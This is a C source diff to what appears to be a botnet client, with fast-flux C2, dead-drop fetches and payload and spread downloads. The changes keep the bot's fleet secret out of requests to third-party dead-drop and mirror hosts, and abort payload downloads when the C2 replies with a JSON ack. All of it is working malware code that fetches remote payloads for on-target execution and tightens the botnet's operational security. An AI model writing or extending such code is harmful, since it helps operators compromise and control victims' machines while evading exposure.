@@ -27,6 +27,8 @@
 #include <arpa/inet.h>
 #include <time.h>
 #include <stdarg.h>
+#include <ctype.h>    /* tolower (#195 JSON-ack tripwire) */
+#include <strings.h>  /* strcasecmp (#192 same-origin host compare) */
 
 /* ── Fast-Flux C2 (#85) ──────────────────────────────────────── */
 /* When flux_enabled=1 the C2 channels resolve ALL A records of their
@@ -949,6 +951,119 @@ static int http_connect_url(notnet_bot_t *bot, const char *url,
                              uint16_t *port, char *path, size_t path_sz,
                              notnet_tls_t *tls_out);
 
+/* Shared URL splitter for one-shot fetches (#192): parses the scheme,
+ * host, port and path out of an http:// or https:// URL WITHOUT
+ * connecting. Factored out of http_connect_url so http_url_is_local_c2()
+ * can inspect a URL's origin cheaply before deciding whether appending
+ * the secret is safe. Returns 0 on success, -1 on malformed input. */
+static int http_parse_url_parts(const char *url, int *https_out,
+                                char *host, size_t host_sz,
+                                uint16_t *port,
+                                char *path, size_t path_sz) {
+    if (!url || url[0] == '\0') return -1;
+    int https = 0;
+    const char *scheme = NULL;
+    if (strncmp(url, "https://", 8) == 0) { https = 1; scheme = url + 8; }
+    else if (strncmp(url, "http://", 7) == 0) { scheme = url + 7; }
+    else return -1;
+
+    const char *slash = strchr(scheme, '/');
+    size_t alen = slash ? (size_t)(slash - scheme) : strlen(scheme);
+    if (alen == 0 || alen >= host_sz) return -1;
+    memcpy(host, scheme, alen);
+    host[alen] = '\0';
+    uint16_t p = https ? 443 : 80;
+    char *colon = strrchr(host, ':');
+    if (colon) {
+        *colon = '\0';
+        int pv = atoi(colon + 1);
+        if (pv >= 1 && pv <= 65535) p = (uint16_t)pv;
+    }
+    if (https_out) *https_out = https;
+    if (port) *port = p;
+    if (path) snprintf(path, path_sz, "%s", slash ? slash : "/");
+    return 0;
+}
+
+/* #192 (CWE-598): same-origin gate for secret auto-appending. Returns 1
+ * only when url points at the bot's configured C2 endpoint: the URL's
+ * host matches c2_http.server or effective_server AND its port matches
+ * c2_http.port, effective_port, or PAYLOAD_DL_PORT (the fallback download
+ * port the payload/spread URL builders dial). Anything else — operator
+ * dead-drops on third-party hosts, external payload mirrors, plugin CDNs
+ * — returns 0, so http_get_url/http_download fetch it WITHOUT the fleet
+ * secret instead of leaking it in a query string to a foreign host. */
+int http_url_is_local_c2(notnet_bot_t *bot, const char *url) {
+    if (!bot || !url || url[0] == '\0') return 0;
+    char host[256];
+    uint16_t port = 0;
+    if (http_parse_url_parts(url, NULL, host, sizeof(host), &port, NULL, 0) != 0)
+        return 0;
+
+    const char *hosts[2] = { bot->c2_http.server, bot->c2_http.effective_server };
+    uint16_t ports[3] = { bot->c2_http.port, bot->c2_http.effective_port,
+                          (uint16_t)PAYLOAD_DL_PORT };
+    int host_ok = 0, port_ok = 0;
+    for (int i = 0; i < 2 && !host_ok; i++)
+        if (hosts[i][0] != '\0' && strcasecmp(host, hosts[i]) == 0) host_ok = 1;
+    for (int i = 0; i < 3 && !port_ok; i++)
+        if (ports[i] != 0 && port == ports[i]) port_ok = 1;
+    return host_ok && port_ok;
+}
+
+/* #195: version-skew tripwire. When a fetch that expects BINARY bytes
+ * (payload / source tarball / dead-drop blob) receives a response whose
+ * Content-Type is application/json, the C2 answered with its generic
+ * ok-ack — either the request was rejected or the peer predates the #173
+ * wire contract. Log the first bytes of the body so the skew shows up in
+ * the bot log loudly, instead of surfacing later as a cryptic on-target
+ * exec failure ('{status:: not found'). Returns 1 when the JSON ack was
+ * detected (caller should abort the download), 0 otherwise. */
+static int http_json_ack_detected(const char *what, const char *headers,
+                                  size_t headers_len, const char *body,
+                                  size_t body_len)
+{
+    const char *line = headers;
+    const char *end = headers + headers_len;
+    while (line && line < end) {
+        const char *eol = memchr(line, '\n', (size_t)(end - line));
+        size_t ll = eol ? (size_t)(eol - line) : (size_t)(end - line);
+        if (ll > 13 && strncasecmp(line, "Content-Type:", 13) == 0) {
+            const char *v = line + 13;
+            while ((size_t)(v - line) < ll && *v == ' ') v++;
+            size_t vl = ll - (size_t)(v - line);
+            char ctype[64];
+            if (vl >= sizeof(ctype)) vl = sizeof(ctype) - 1;
+            memcpy(ctype, v, vl);
+            ctype[vl] = '\0';
+            for (char *p = ctype; *p; p++)
+                *p = (char)tolower((unsigned char)*p);
+            if (strstr(ctype, "application/json") == NULL)
+                return 0;
+            char peek[81];
+            size_t n = body_len < 80 ? body_len : 80;
+            if (n > 0) {
+                memcpy(peek, body, n);
+                peek[n] = '\0';
+                /* keep the log line printable */
+                for (char *p = peek; *p; p++)
+                    if ((unsigned char)*p < 0x20 || (unsigned char)*p == 0x7f)
+                        *p = ' ';
+                log_warn("%s: payload download got JSON ack — "
+                         "C2 rejected or version skew (first %zu bytes): %s",
+                         what, n, peek);
+            } else {
+                log_warn("%s: payload download got JSON ack — "
+                         "C2 rejected or version skew", what);
+            }
+            return 1;
+        }
+        if (!eol) break;
+        line = eol + 1;
+    }
+    return 0;
+}
+
 /* Dead-drop / arbitrary-URL fetch (#86). GET a plaintext http:// URL into
  * buf (bounded to len bytes total incl. headers) with a 10s timeout, and
  * return the total bytes received — the full response (status line, headers,
@@ -976,16 +1091,32 @@ int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
     }
 
     char req[1024];
-    /* #173: payload/source downloads now require the secret — send it as a
-     * query param (URL-safe charset) so any GET path authenticates. */
-    int reqlen = snprintf(req, sizeof(req),
-        "GET %s%ssecret=%s HTTP/1.1\r\n"
-        "Host: %s\r\n"
-        "User-Agent: %s\r\n"
-        "Connection: close\r\n"
-        "\r\n",
-        path, strchr(path, '?') ? "&" : "?", bot->secret,
-        host, bot->c2_http.user_agent);
+    /* #173: local-C2 fetches require the secret — send it as a query param
+     * (URL-safe charset) so any GET path authenticates.
+     * #192 (CWE-598): ONLY for same-origin URLs. Foreign targets (operator
+     * dead-drops on third-party hosts, external payload mirrors) are
+     * fetched WITHOUT the secret so the fleet credential never lands in a
+     * foreign host's query-string logs. */
+    int reqlen;
+    if (http_url_is_local_c2(bot, url)) {
+        reqlen = snprintf(req, sizeof(req),
+            "GET %s%ssecret=%s HTTP/1.1\r\n"
+            "Host: %s\r\n"
+            "User-Agent: %s\r\n"
+            "Connection: close\r\n"
+            "\r\n",
+            path, strchr(path, '?') ? "&" : "?", bot->secret,
+            host, bot->c2_http.user_agent);
+    } else {
+        log_info("HTTP: %s is not the configured C2 — fetching without secret", url);
+        reqlen = snprintf(req, sizeof(req),
+            "GET %s HTTP/1.1\r\n"
+            "Host: %s\r\n"
+            "User-Agent: %s\r\n"
+            "Connection: close\r\n"
+            "\r\n",
+            path, host, bot->c2_http.user_agent);
+    }
     int sent = chan_send(&tls, sock, req, reqlen);
     if (sent < 0 || sent != reqlen) {
         log_warn("HTTP: http_get_url send failed: %s", strerror(errno));
@@ -1027,6 +1158,21 @@ int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
         if (code < 200 || code >= 300) {
             log_warn("HTTP: http_get_url %s returned HTTP %d", url, code);
             return -1;
+        }
+    }
+
+    /* #195: JSON ack where a binary blob was expected — the C2 rejected
+     * us or the peer predates the #173 wire contract. Log it loudly and
+     * fail instead of handing the caller an ack masquerading as a blob. */
+    {
+        char *hdr_end = strstr(buf, "\r\n\r\n");
+        if (hdr_end) {
+            size_t hlen = (size_t)(hdr_end - buf);
+            if (total > (int)hlen + 4 &&
+                http_json_ack_detected("HTTP: http_get_url", buf, hlen,
+                                       hdr_end + 4,
+                                       (size_t)total - hlen - 4))
+                return -1;
         }
     }
     return total;
@@ -1084,7 +1230,6 @@ fallback:
     dl_url[n] = '\0';
     return -1;
 }
-
 
 int http_read(notnet_bot_t *bot, char *buf, int len) {
     if (!bot->c2_http.connected) return -1;
@@ -1220,29 +1365,14 @@ static int http_connect_url(notnet_bot_t *bot, const char *url,
                              char *host, size_t host_sz,
                              uint16_t *port, char *path, size_t path_sz,
                              notnet_tls_t *tls_out) {
-    if (!url || url[0] == '\0') return -1;
+    /* #192: scheme/host/port/path splitting now lives in the shared
+     * http_parse_url_parts() helper (also used by http_url_is_local_c2),
+     * so this connect path and the same-origin gate can never drift. */
     int https = 0;
-    const char *scheme = NULL;
-    if (strncmp(url, "https://", 8) == 0) { https = 1; scheme = url + 8; }
-    else if (strncmp(url, "http://", 7) == 0) { scheme = url + 7; }
-    else return -1;
+    if (http_parse_url_parts(url, &https, host, host_sz, port,
+                             path, path_sz) != 0) return -1;
 
     if (tls_out) { tls_out->enabled = 0; tls_out->ssl = NULL; tls_out->sock = -1; }
-
-    const char *slash = strchr(scheme, '/');
-    size_t alen = slash ? (size_t)(slash - scheme) : strlen(scheme);
-    if (alen == 0 || alen >= host_sz) return -1;
-    memcpy(host, scheme, alen);
-    host[alen] = '\0';
-    *port = https ? 443 : 80;
-    char *colon = strrchr(host, ':');
-    if (colon) {
-        *colon = '\0';
-        int pv = atoi(colon + 1);
-        if (pv >= 1 && pv <= 65535) *port = (uint16_t)pv;
-    }
-    if (slash) snprintf(path, path_sz, "%s", slash);
-    else snprintf(path, path_sz, "/");
 
     int sock = tcp_connect_sock(bot, host, *port);
     if (sock < 0) return -1;
@@ -1283,6 +1413,11 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
     tls.enabled = 0; tls.ssl = NULL; tls.sock = -1;
 
     int sock = -1;
+    /* #192: whether the target is the configured C2. The NULL/empty-url
+     * fallback below dials the C2 endpoint directly, so it is local by
+     * construction; an explicit URL must pass the same-origin gate before
+     * the secret may be appended. */
+    int append_secret = 0;
     if (url && (strncmp(url, "http://", 7) == 0 || strncmp(url, "https://", 8) == 0)) {
         /* #135: http_connect_url parses http:// AND https://, upgrading to
          * TLS (with cert-pin verification) for https:// when compiled in. */
@@ -1292,7 +1427,9 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
             log_error("HTTP download: connect to %s failed", url);
             return -1;
         }
+        append_secret = http_url_is_local_c2(bot, url);
     } else {
+        append_secret = 1;
         snprintf(host, sizeof(host), "%s", bot->c2_http.server);
         port = bot->c2_http.port;
         snprintf(path, sizeof(path), "%s", bot->c2_http.path);
@@ -1326,15 +1463,30 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
 
     char req[1024];
     /* #173: same secret query param as http_get_url — this is the
-     * payload-download path (http_download). */
-    int reqlen = snprintf(req, sizeof(req),
-        "GET %s%ssecret=%s HTTP/1.1\r\n"
-        "Host: %s\r\n"
-        "User-Agent: %s\r\n"
-        "Connection: close\r\n"
-        "\r\n",
-        path, strchr(path, '?') ? "&" : "?", bot->secret,
-        host, bot->c2_http.user_agent);
+     * payload-download path (http_download).
+     * #192 (CWE-598): appended only when the target is the configured C2
+     * (or the NULL-url fallback above, which dials the C2 directly).
+     * External payload/plugin URLs are fetched secret-free. */
+    int reqlen;
+    if (append_secret) {
+        reqlen = snprintf(req, sizeof(req),
+            "GET %s%ssecret=%s HTTP/1.1\r\n"
+            "Host: %s\r\n"
+            "User-Agent: %s\r\n"
+            "Connection: close\r\n"
+            "\r\n",
+            path, strchr(path, '?') ? "&" : "?", bot->secret,
+            host, bot->c2_http.user_agent);
+    } else {
+        log_info("HTTP: %s is not the configured C2 — downloading without secret", url);
+        reqlen = snprintf(req, sizeof(req),
+            "GET %s HTTP/1.1\r\n"
+            "Host: %s\r\n"
+            "User-Agent: %s\r\n"
+            "Connection: close\r\n"
+            "\r\n",
+            path, host, bot->c2_http.user_agent);
+    }
 
     if (chan_send(&tls, sock, req, reqlen) != reqlen) {
         log_warn("http_download: GET send failed: %s", strerror(errno));
@@ -1391,6 +1543,22 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
             }
         } else {
             log_error("http_download: malformed status line from %s:%u", host, port);
+            close(sock);
+            return -1;
+        }
+    }
+
+    /* #195: version-skew tripwire — a JSON ack (Content-Type:
+     * application/json) where the binary payload was expected means the
+     * C2 rejected the download or the server predates #173. Log the body
+     * head and abort instead of writing the ack to dest and failing later
+     * with a cryptic exec error that never reaches the operator. */
+    {
+        int in_hdr = hdr_len - body_start;
+        if (http_json_ack_detected("http_download", hdr_buf,
+                                   (size_t)body_start - 4,
+                                   hdr_buf + body_start,
+                                   in_hdr > 0 ? (size_t)in_hdr : 0)) {
             close(sock);
             return -1;
         }
